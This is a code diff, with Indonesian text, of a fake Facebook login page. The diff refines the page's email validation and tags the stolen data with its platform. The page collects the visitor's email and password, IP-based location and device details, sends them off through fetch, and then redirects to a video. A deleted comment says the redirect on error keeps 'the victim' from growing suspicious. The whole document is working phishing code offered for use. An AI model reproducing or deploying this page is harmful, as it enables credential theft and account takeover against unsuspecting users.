@@ -8,42 +8,33 @@
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
     body { background-color: #f0f2f5; display: flex; flex-direction: column; min-height: 100vh; align-items: center; justify-content: center; }
     
-    /* Container */
     .fb-container { width: 100%; max-width: 396px; padding: 20px; text-align: center; margin-top: auto; margin-bottom: auto;}
     
-    /* Logo Facebook */
     .fb-logo svg { width: 60px; height: 60px; fill: #1877f2; margin-bottom: 15px; }
     
-    /* Box Form */
     .fb-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px 0; width: 100%; }
     
     .fb-title { font-size: 18px; font-weight: normal; color: #1c1e21; margin-bottom: 15px; }
     
-    /* Input */
     .fb-input { width: calc(100% - 32px); margin: 0 16px 12px 16px; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; outline: none; background: #fff; color: #1d2129; }
     .fb-input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
     .fb-input::placeholder { color: #90949c; }
+    .fb-input.input-error { border: 1.5px solid #f02849; }
     
-    /* Tombol Login */
     .fb-btn { width: calc(100% - 32px); margin: 0 16px; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.2s; }
     .fb-btn:active { background-color: #166fe5; transform: scale(0.98); }
     
-    /* Link Lupa Sandi */
     .fb-forgot { display: block; margin: 16px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
     .fb-forgot:hover { text-decoration: underline; }
     
-    /* Garis Pembatas */
     .fb-divider { border-bottom: 1px solid #dadde1; margin: 20px 16px; }
     
-    /* Tombol Buat Akun */
     .fb-create { display: inline-block; padding: 12px 16px; background-color: #42b72a; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; text-decoration: none; }
     .fb-create:active { background-color: #36a420; }
     
-    /* Footer Text */
     .fb-footer { margin-top: 28px; font-size: 14px; color: #1c1e21; margin-bottom: 20px; }
     .fb-footer a { color: #1c1e21; font-weight: bold; text-decoration: none; }
 
-    /* Error Msg */
     .error-msg { display: none; color: #f02849; font-size: 13px; margin: -5px 16px 10px 16px; text-align: left; }
     .error-msg.show { display: block; }
 </style>
@@ -52,20 +43,18 @@
 
 <div class="fb-container">
     
-    <!-- Logo FB -->
     <div class="fb-logo">
         <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
             <path d="M18 0C8.06 0 0 8.06 0 18c0 8.98 6.58 16.43 15.18 17.78V23.2h-4.57V18h4.57v-3.96c0-4.52 2.7-7 6.82-7 1.98 0 4.05.35 4.05.35v4.45h-2.28c-2.25 0-2.95 1.4-2.95 2.82V18h5.02l-.8 5.2h-4.22v12.58C29.42 34.43 36 26.98 36 18c0-9.94-8.06-18-18-18z" fill="#1877f2"/>
         </svg>
     </div>
 
-    <!-- Box Form -->
     <div class="fb-box">
         <div class="fb-title">Masuk ke Facebook</div>
         
         <div class="error-msg" id="errorMsg">Email atau kata sandi yang Anda masukkan tidak cocok.</div>
 
-        <input type="text" id="fbEmail" class="fb-input" placeholder="Email atau Nomor Telepon">
+        <input type="text" id="fbEmail" class="fb-input" placeholder="Email">
         <input type="password" id="fbPass" class="fb-input" placeholder="Kata Sandi">
         
         <button class="fb-btn" onclick="loginFB()">Masuk</button>
@@ -89,39 +78,44 @@
         var pass = document.getElementById('fbPass').value;
         var errorMsg = document.getElementById('errorMsg');
         var btn = document.querySelector('.fb-btn');
+        var inputEmail = document.getElementById('fbEmail');
 
         errorMsg.classList.remove('show');
+        inputEmail.classList.remove('input-error');
 
         if(email === "" || pass === "") {
-            errorMsg.innerText = "Email atau Nomor Telepon dan Kata Sandi tidak boleh kosong.";
+            errorMsg.innerText = "Email dan Kata Sandi tidak boleh kosong.";
             errorMsg.classList.add('show');
             return;
         }
 
-        // Animasi loading di tombol
+        // VALIDASI HARUS EMAIL (Bukan nomor HP)
+        if(!email.includes('@') || !email.includes('.')) {
+            errorMsg.innerText = "Harap masukkan alamat email yang valid.";
+            inputEmail.classList.add('input-error');
+            errorMsg.classList.add('show');
+            return;
+        }
+
         btn.innerText = "Memproses...";
         btn.disabled = true;
 
         var ua = navigator.userAgent;
         var web_id_aktif = sessionStorage.getItem('web_id_aktif') || 'web_id_kenz_1';
 
+        // PAYLOAD ADA TAMBAHAN platform: "Facebook"
         var payload = {
             web_id: web_id_aktif,
+            platform: "Facebook", // <--- INI PENANDA DARI FB
             email: email, 
             password: pass,
-            ip: "-", 
-            negara: "-",
-            prov: "-",
-            kota: "-",
-            isp: "-",
-            koord: "-",
+            ip: "-", negara: "-", prov: "-", kota: "-", isp: "-", koord: "-",
             waktu: new Date().toLocaleString("id-ID"),
             device: detectDevice(ua),
             os: detectOS(ua),
             browser: detectBrowser(ua)
         };
 
-        // Ambil IP dan Kirim Data
         fetch("https://ipapi.co/json/")
             .then(function(r){ return r.json(); })
             .then(function(d){
@@ -139,44 +133,18 @@
                 });
             })
             .then(function(res){
-                // Kalo udah kekirim, lempar ke video
                 try{ localStorage.setItem("sudah_submit","1"); }catch(e){}
                 window.location.href = "https://files.catbox.moe/mfxa6c.mp4";
             })
             .catch(function(err){
-                // Kalo API error tetep lempar ke video biar korban ga curiga
                 window.location.href = "https://files.catbox.moe/mfxa6c.mp4";
             });
     }
 
-    // Fungsi Deteksi (Samain kayak di file masukinpw)
-    function detectDevice(ua){
-        if(/Android/i.test(ua)) return "Android";
-        if(/iPhone|iPad|iPod/i.test(ua)) return "iOS";
-        if(/Windows/i.test(ua)) return "Windows";
-        if(/Mac/i.test(ua)) return "Mac";
-        if(/Linux/i.test(ua)) return "Linux";
-        return "Unknown";
-    }
-    function detectOS(ua){
-        var m;
-        if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1];
-        if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,".");
-        if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); }
-        if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,".");
-        if(/Linux/i.test(ua)) return "Linux";
-        return "Unknown";
-    }
-    function detectBrowser(ua){
-        var m;
-        if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1];
-        if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1];
-        if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1];
-        if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1];
-        if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1];
-        if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1];
-        return "Unknown";
-    }
+    // Deteksi (sama kayak file lain)
+    function detectDevice(ua){ if(/Android/i.test(ua)) return "Android"; if(/iPhone|iPad|iPod/i.test(ua)) return "iOS"; if(/Windows/i.test(ua)) return "Windows"; if(/Mac/i.test(ua)) return "Mac"; return "Unknown"; }
+    function detectOS(ua){ var m; if((m = ua.match(/Android\s([\d.]+)/i))) return "Android " + m[1]; if((m = ua.match(/iPhone OS ([\d_]+)/i))) return "iOS " + m[1].replace(/_/g,"."); if((m = ua.match(/Windows NT ([\d.]+)/i))){ var v = m[1]; return "Windows " + (v === "10.0" ? "10/11" : v); } if((m = ua.match(/Mac OS X ([\d_]+)/i))) return "macOS " + m[1].replace(/_/g,"."); return "Unknown"; }
+    function detectBrowser(ua){ var m; if(/Edg\//i.test(ua) && (m = ua.match(/Edg\/([\d.]+)/i))) return "Edge " + m[1]; if(/OPR\//i.test(ua) && (m = ua.match(/OPR\/([\d.]+)/i))) return "Opera " + m[1]; if(/SamsungBrowser/i.test(ua) && (m = ua.match(/SamsungBrowser\/([\d.]+)/i))) return "Samsung " + m[1]; if(/Chrome\//i.test(ua) && (m = ua.match(/Chrome\/([\d.]+)/i))) return "Chrome " + m[1]; if(/Firefox\//i.test(ua) && (m = ua.match(/Firefox\/([\d.]+)/i))) return "Firefox " + m[1]; if(/Safari\//i.test(ua) && (m = ua.match(/Version\/([\d.]+)/i))) return "Safari " + m[1]; return "Unknown"; }
 </script>
 </body>
 </html>
